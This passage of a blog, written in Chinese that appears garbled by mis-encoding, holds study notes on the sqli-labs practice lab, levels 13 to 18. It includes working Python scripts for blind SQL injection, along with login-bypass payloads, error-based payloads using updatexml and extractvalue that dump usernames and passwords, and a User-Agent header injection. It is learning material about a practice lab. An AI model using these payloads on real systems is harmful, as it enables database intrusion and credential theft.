(database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># æšä¸¾å­—ç¬¦çš„payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(database())</span><br><span class="hljs-string">	,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># postè¯·æ±‚å‚æ•°</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># åˆ¤æ–­é•¿åº¦</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># ä¿®æ”¹è¯·æ±‚å‚æ•°</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># å‡ºç°æ­¤å†…å®¹ä¸ºç™»å½•æˆåŠŸ</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æµ‹è¯•æˆåŠŸï¼Œé•¿åº¦ä¸ºï¼š&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ­£åœ¨æµ‹è¯•é•¿åº¦ï¼š&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># æšä¸¾å­—ç¬¦</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æˆªå–</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># æšä¸¾å­—ç¬¦çš„æ¯ä¸€ç§å¯èƒ½æ€§</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç¬¬&#x27;</span>, l, <span class="hljs-string">&#x27;ä¸ªå­—ç¬¦æšä¸¾æˆåŠŸï¼š&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure>
<p>å¯ä»¥æ¢database()æ¥å®ç°å…¶å®ƒæ³¨å…¥,less13ç”¨å•å¼•å·ï¼Œless14ç”¨åŒå¼•å·<br>è„šæœ¬å‡ºå¤„ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a></p>
<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>æ¢äº†é—­åˆç‚¹ï¼Œå¯ä»¥æŒ‰less13çš„æ–¹å¼è§£ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;password=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span> #&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure>
<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>æ²¡æœ‰æŠ¥é”™å›æ˜¾ï¼Œæ— æ³•ç”¨æŠ¥é”™æ³¨å…¥ï¼Œåªèƒ½ç”¨å¸ƒå°”ç›²æ³¨<br>é—­åˆç‚¹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or true#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>


<hr>
<h2 id="title-note-09date-2025-03-09-02-27-08tags-sql-labs"><a href="#title-note-09date-2025-03-09-02-27-08tags-sql-labs" class="headerlink" title="title: note-09date: 2025-03-09 02:27:08tags: sql-labs"></a>title: note-09<br>date: 2025-03-09 02:27:08<br>tags: sql-labs</h2><h1 id="sql-labs-less16"><a href="#sql-labs-less16" class="headerlink" title="sql-labs-less16"></a>sql-labs-less16</h1><p>å…ˆæ‰¾ä¸€ä¸‹æ³¨å…¥ç‚¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) or true#&amp;submit=Submit<br></code></pre></td></tr></table></figure>
<p>å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œæ— æœ<br>è¿›è¡Œç›²æ³¨<br>æ”¹ä¸€ä¸‹less14çš„è„šæœ¬æ¥ç”¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># ç½‘ç«™è·¯å¾„</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-16/&quot;</span><br><span class="hljs-comment"># åˆ¤æ–­é•¿åº¦çš„payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or length(</span><br><span class="hljs-string">	(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># æšä¸¾å­—ç¬¦çš„payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or ascii(</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;l&#125;,1)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># postè¯·æ±‚å‚æ•°</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;aâ€œ or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># åˆ¤æ–­é•¿åº¦</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># ä¿®æ”¹è¯·æ±‚å‚æ•°</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># å‡ºç°æ­¤å†…å®¹ä¸ºç™»å½•æˆåŠŸ</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æµ‹è¯•æˆåŠŸï¼Œé•¿åº¦ä¸ºï¼š&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ­£åœ¨æµ‹è¯•é•¿åº¦ï¼š&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># æšä¸¾å­—ç¬¦</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æˆªå–</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># æšä¸¾å­—ç¬¦çš„æ¯ä¸€ç§å¯èƒ½æ€§</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç¬¬&#x27;</span>, l, <span class="hljs-string">&#x27;ä¸ªå­—ç¬¦æšä¸¾æˆåŠŸï¼š&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br><br></code></pre></td></tr></table></figure>
<p>byï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a><br>åªç”¨æ”¹payloadä¸­çš„ï¼Œä¸¤ä¸ªéƒ½è¦æ”¹ä¸ç„¶å­—é•¿å¯¹ä¸ä¸Š  </p>
<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>è¾“å…¥æ­£ç¡®çš„è´¦æˆ·å’Œå¯†ç ï¼šadminï¼Œadmin<br>æç¤ºå¯†ç å·²æ›´æ–°<br>çœ‹æ¥é¡µé¢æ˜¯èƒ½å¯¹åŸæœ‰ç”¨æˆ·å¯†ç è¿›è¡Œä¿®æ”¹<br>åœ¨less1ç¡®è®¤äº†çŒœæµ‹æ˜¯æ­£ç¡®çš„ã€‚<br>æ²¡æƒ³æ³•äº†å»æŸ¥åšå®¢ï¼Œ<br>æŸ¥çœ‹é¡µé¢æºç ï¼Œæ˜¯å¯¹usernameåšäº†è¿‡æ»¤ï¼Œä¼šå…ˆæ£€æŸ¥åº“é‡Œæ˜¯å¦æœ‰å¯¹åº”username<br>åªèƒ½ä»passwordæ³¨å…¥</p>
<h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br>æˆ–è€…<br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>å›æ˜¾  </p>
<blockquote>
<p>You canâ€™t specify target table â€˜usersâ€™ for update in FROM clause  </p>
</blockquote>
<p>çœ‹æ¥æ˜¯ä¸èƒ½ç›´æ¥çˆ†è¡¨  </p>
<blockquote>
<p>åŸå› æ˜¯mysqlæ•°æ®ä¸æ”¯æŒæŸ¥è¯¢å’Œæ›´æ–°æ˜¯åŒä¸€å¼ è¡¨ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ ä¸€ä¸ªä¸­é—´è¡¨ã€‚è¿™ä¸ªå…³å¡éœ€è¦è¾“å…¥æ­£ç¡®è´¦å·å› ä¸ºæ˜¯å¯†ç é‡ç½®é¡µé¢ï¼Œæ‰€ä»¥çˆ†å‡ºçš„æ˜¯è¯¥è´¦æˆ·çš„åŸå§‹å¯†ç ã€‚å¦‚æœæŸ¥è¯¢æ—¶ä¸æ˜¯usersè¡¨å°±ä¸ä¼šæŠ¥é”™ã€‚</p>
</blockquote>
<p>æ­¤payloadåˆ›å»ºäº†æ–°çš„ä¸´æ—¶è¡¨xæ¥é¿å…å¯¹æ­£åœ¨æ›´æ–°çš„usersè¡¨è¿›è¡Œç›´æ¥æŸ¥è¯¢</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">123456</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select * from(select concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users limit 0,1)x)))#</span><br></code></pre></td></tr></table></figure>

<p>KIMI:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR (updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#  </span><br><span class="hljs-string">```  </span><br><span class="hljs-string">updatxml()</span><br><span class="hljs-string">```sql</span><br><span class="hljs-string">updatexml(1, concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;, data), 1)  </span><br><span class="hljs-string">å¦‚æœdataæ˜¯ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œé‚£ä¹ˆå½“updatexml()å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå› ä¸ºxpath_exprä¸ç¬¦åˆè¦æ±‚è€ŒæŠ¥é”™ï¼Œ</span><br><span class="hljs-string">é”™è¯¯ä¿¡æ¯ä¸­ä¼šåŒ…å«dataçš„å†…å®¹ã€‚  </span><br></code></pre></td></tr></table></figure>
<p>æ•°æ®æŸ¥è¯¢éƒ¨åˆ†ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, username, password) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">FROM</span> users)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>åŠŸèƒ½ï¼š  </p>
<blockquote>
<p>SELECT username, password FROM usersï¼šä»usersè¡¨ä¸­æŸ¥è¯¢usernameå’Œpasswordå­—æ®µã€‚<br>(â€¦â€¦)textï¼šè¿™æ˜¯ä¸€ä¸ªæ´¾ç”Ÿè¡¨ï¼ˆå­æŸ¥è¯¢çš„ç»“æœè¢«å½“ä½œä¸€ä¸ªä¸´æ—¶è¡¨ï¼‰ï¼Œå‘½åä¸ºtextã€‚æ´¾ç”Ÿè¡¨çš„ä½œç”¨æ˜¯ç»•è¿‡æŸäº›SQLæ³¨å…¥åœºæ™¯ä¸­å¯¹ç›´æ¥æŸ¥è¯¢è¡¨çš„é™åˆ¶ã€‚<br>concat_ws(â€˜:â€™, username, password)ï¼šå°†usernameå’Œpasswordå­—æ®µç”¨å†’å·ï¼ˆ:ï¼‰æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚admin:password123ã€‚<br>LIMIT 0,1ï¼šé™åˆ¶æŸ¥è¯¢ç»“æœåªè¿”å›ç¬¬ä¸€è¡Œæ•°æ®ã€‚<br>ä½œç”¨ï¼š<br>ä»usersè¡¨ä¸­æå–ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶å°†å®ƒä»¬æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½œä¸ºupdatexml()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚  </p>
</blockquote>
<p>æ‰§è¡Œè¿‡ç¨‹ï¼š  </p>
<blockquote>
<p>é—­åˆåŸè¯­å¥å¹¶æ³¨å…¥é€»è¾‘ï¼š ORæ“ä½œä½¿å¾—æ³¨å…¥çš„è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œã€‚<br>æŸ¥è¯¢æ•°æ®ï¼š ä»usersè¡¨ä¸­æå–ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br>è§¦å‘æŠ¥é”™ï¼š å°†æ‹¼æ¥åçš„å­—ç¬¦ä¸²ä½œä¸ºupdatexml()çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè§¦å‘æŠ¥é”™ã€‚<br>æ³„éœ²æ•°æ®ï¼š æŠ¥é”™ä¿¡æ¯ä¸­ä¼šåŒ…å«æ‹¼æ¥åçš„å­—ç¬¦ä¸²ï¼Œä»è€Œæ³„éœ²ç”¨æˆ·åå’Œå¯†ç ã€‚<br>è¿”å›ç»“æœï¼š<br>å½“è¿™ä¸ªæ³¨å…¥è¯­å¥æ‰§è¡Œæ—¶ï¼ŒMySQLä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š<br>XPATH syntax error: â€˜!admin:password123â€™<br>ä»è¿™ä¸ªé”™è¯¯ä¿¡æ¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æå–å‡ºadmin:password123ï¼Œä»è€Œè·å–åˆ°ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
</blockquote>
<h2 id="group-byæŠ¥é”™æ³¨å…¥"><a href="#group-byæŠ¥é”™æ³¨å…¥" class="headerlink" title="group byæŠ¥é”™æ³¨å…¥"></a>group byæŠ¥é”™æ³¨å…¥</h2><p>ä¸æƒ³çœ‹äº†ï¼Œåæ­£å…ˆçŸ¥é“æœ‰è¿™ä¸ªgroup byæŠ¥é”™æ³¨å…¥</p>
<h2 id="å‡½æ•°è¯´æ˜-é”™è¯¯è¯´æ˜"><a href="#å‡½æ•°è¯´æ˜-é”™è¯¯è¯´æ˜" class="headerlink" title="å‡½æ•°è¯´æ˜,é”™è¯¯è¯´æ˜"></a>å‡½æ•°è¯´æ˜,é”™è¯¯è¯´æ˜</h2><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><p>è¯­æ³•ï¼šconcat_ws(separator, str1, str2, â€¦, strN)<br>åŠŸèƒ½ï¼šå°†ä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ç”¨æŒ‡å®šçš„åˆ†éš”ç¬¦è¿æ¥èµ·æ¥ï¼Œè¿”å›è¿æ¥åçš„å­—ç¬¦ä¸²ã€‚<br>ç‰¹ç‚¹ï¼š<br>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆ†éš”ç¬¦ï¼Œåç»­å‚æ•°æ˜¯è¦è¿æ¥çš„å­—ç¬¦ä¸²ã€‚<br>å¦‚æœåˆ†éš”ç¬¦ä¸º NULLï¼Œåˆ™ç»“æœä¸º NULLã€‚<br>å¦‚æœæŸä¸ªå­—ç¬¦ä¸²ä¸º NULLï¼Œåˆ™åœ¨è¿æ¥æ—¶ä¼šè·³è¿‡è¯¥å­—ç¬¦ä¸²ã€‚  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;ç”¨æˆ·å&#x27;</span>, <span class="hljs-string">&#x27;å¯†ç &#x27;</span>, <span class="hljs-string">&#x27;é‚®ç®±&#x27;</span>);<br><span class="hljs-comment">-- ç»“æœï¼šç”¨æˆ·å:å¯†ç :é‚®ç®±</span><br></code></pre></td></tr></table></figure>

<h3 id="extractvalueå‡½æ•°"><a href="#extractvalueå‡½æ•°" class="headerlink" title="extractvalueå‡½æ•°"></a>extractvalueå‡½æ•°</h3><blockquote>
<p>1â€™ and extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)# </p>
</blockquote>
<p>å›æ˜¾  </p>
<blockquote>
<p>Incorrect parameter count in the call to native function â€˜extractvalueâ€™</p>
</blockquote>
<p>KIMIï¼š<br>å‡ºç°è¿™ä¸ªé”™è¯¯æ˜¯å› ä¸ºextractvalue()å‡½æ•°çš„å‚æ•°æ•°é‡ä¸æ­£ç¡®ã€‚extractvalue()å‡½æ•°åœ¨mysqlä¸­ç”¨äºä»xmlæ•°æ®ä¸­æå–å€¼ï¼Œå®ƒçš„è¯­æ³•æ˜¯ï¼š  </p>
<blockquote>
<p>extractvalue(xml_target, xpath_expression)  </p>
</blockquote>
<p>å®ƒåªæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š<br>xml_targetï¼šè¦ä»ä¸­æå–å€¼çš„xmlæ•°æ®ã€‚<br>xpath_expressionï¼šç”¨äºå®šä½xmlæ•°æ®ä¸­ç‰¹å®šèŠ‚ç‚¹çš„xpathè¡¨è¾¾å¼ã€‚<br>è€Œåœ¨ä½ çš„payloadä¸­ï¼š  </p>
<blockquote>
<p>extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)  </p>
</blockquote>
<p>ä½ ä¼ é€’äº†ä¸‰ä¸ªå‚æ•°ç»™extractvalue()å‡½æ•°ï¼Œè¿™æ˜¾ç„¶ä¸ç¬¦åˆå®ƒçš„å®šä¹‰ï¼Œå› æ­¤mysqlä¼šæŠ¥é”™ï¼Œæç¤ºå‚æ•°æ•°é‡ä¸æ­£ç¡®ã€‚<br>æ­£ç¡®çš„ç”¨æ³•ç¤ºä¾‹<br>å¦‚æœä½ æƒ³ä½¿ç”¨extractvalue()å‡½æ•°æ¥è¿›è¡Œsqlæ³¨å…¥å¹¶è·å–æ•°æ®ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹payloadï¼š  </p>
<blockquote>
<p>1â€™ and extractvalue(1, concat(0x7e,(select group_concat(id,username,password) from users),0x7e))#  </p>
</blockquote>
<p>è¿™é‡Œåªä¼ é€’äº†ä¸¤ä¸ªå‚æ•°ç»™extractvalue()å‡½æ•°ï¼Œç¬¦åˆå®ƒçš„å®šä¹‰ï¼Œå› æ­¤ä¸ä¼šå‡ºç°å‚æ•°æ•°é‡é”™è¯¯çš„é—®é¢˜ã€‚</p>
<h3 id="æ´¾ç”Ÿè¡¨"><a href="#æ´¾ç”Ÿè¡¨" class="headerlink" title="æ´¾ç”Ÿè¡¨"></a>æ´¾ç”Ÿè¡¨</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">(... ...)word<br>(<span class="hljs-selector-tag">SELECT</span> username, password <span class="hljs-selector-tag">FROM</span> users)<span class="hljs-selector-tag">text</span> #ä¸ºæ´¾ç”Ÿè¡¨<span class="hljs-selector-tag">text</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-10date-2025-03-10-21-45-47tags-sql-labs"><a href="#title-note-10date-2025-03-10-21-45-47tags-sql-labs" class="headerlink" title="title: note-10date: 2025-03-10 21:45:47tags: sql-labs"></a>title: note-10<br>date: 2025-03-10 21:45:47<br>tags: sql-labs</h2><h1 id="less18-å¯èƒ½æ˜¯å«åšæŠ¥å¤´æ³¨å…¥"><a href="#less18-å¯èƒ½æ˜¯å«åšæŠ¥å¤´æ³¨å…¥" class="headerlink" title="less18 å¯èƒ½æ˜¯å«åšæŠ¥å¤´æ³¨å…¥"></a>less18 å¯èƒ½æ˜¯å«åšæŠ¥å¤´æ³¨å…¥</h1><p>åœ¨æœ‰å¤´éƒ¨å›æ˜¾çš„çŠ¶å†µä¸‹ç”¨  </p>
<p>å¦‚å›¾payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#<br></code></pre></td></tr></table></figure>
<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/1.png" srcset="/img/loading.gif" lazyload alt="1">  </p>
<p>å› ä¸ºæºç é‡Œæœ‰æ£€æŸ¥ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¦è¾“å…¥ä¸‰ä¸ªå‚æ•°ï¼Œæˆ–è€…ç”¨</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br>```  <br>é—­åˆï¼Œæ­¤æ—¶åç«¯ä»£ç å°±ä¼šå˜æˆ<br>```sql<br>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27;, &#x27;$IP&#x27;, $uname)&quot;;<br></code></pre></td></tr></table></figure>
<p>å‰åä¸¤ç«¯çš„â€™æ˜¯ä¸ºäº†é—­åˆåŸæœ‰çš„å•å¼•å·ä¸­é—´ç”¨andï¼Œorç­‰è¿æ¥å³å¯ã€‚</p>
<blockquote>
<p>é—­åˆå•å¼•å·ï¼šé€šè¿‡â€™é—­åˆåŸSQLè¯­å¥ä¸­çš„å•å¼•å·ï¼Œç¡®ä¿è¯­æ³•æ­£ç¡®ã€‚  </p>
</blockquote>
<blockquote>
<p>ä½¿ç”¨orï¼šorç”¨äºç¡®ä¿å³ä½¿åŸè¯­å¥çš„æ¡ä»¶ä¸æˆç«‹ï¼Œæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ä»ç„¶ä¼šè¢«æ‰§è¡Œã€‚  </p>
</blockquote>
<blockquote>
<p>æ³¨å…¥extractvalue()ï¼šextractvalue()å‡½æ•°è¢«ç”¨æ¥è§¦å‘æŠ¥é”™ï¼Œconcat(0x7e,database())å°†æ•°æ®åº“åç§°ä¸ä¸€ä¸ªæ³¢æµªå·ï¼ˆ0x7eæ˜¯æ³¢æµªå·çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰æ‹¼æ¥ï¼Œä»è€Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­å›æ˜¾å‡ºæ•°æ®åº“åç§°ã€‚  </p>
</blockquote>
<blockquote>
